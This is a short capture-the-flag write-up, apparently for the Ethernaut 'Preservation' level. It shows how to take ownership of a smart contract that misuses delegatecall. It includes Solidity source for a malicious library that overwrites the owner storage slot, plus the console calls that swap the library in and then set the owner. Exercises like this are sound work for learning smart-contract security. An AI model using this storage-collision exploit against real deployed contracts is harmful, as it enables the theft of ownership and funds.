# Answer

Goal: Claim ownership of the contract instance.

## 1. Altering the library address

The contract is misusing delegateCall and opens itself up to a dangeours exploit. We are able to change the stored `timeZone1Library` address by calling either `setFirstTime` or `setSecondTime` with the new address.

The idea is to replace the `timeZone1Library` with our own implementation:

```solidity
contract MaliciousLibraryContract {
    uint256 slot1;
    uint256 slot2;
    address owner;

    function setTime(uint256 newOwner) public {
        owner = address(uint160(newOwner));
    }
}
```

Since the original libraries we're already compromised, we only need to shift the storage slot we want changed. And that of course is the owner.

After that we call the `setFirstTime` with the deployed MaliciousLibraryContract address:

```js
await contract.setFirstTime('<malicious library address>')
```

## 2. Altering the library address

Now that the original library is replaced we can call the same function but now we supply our own wallet address.

```js
await contract.setFirstTime(player)
```
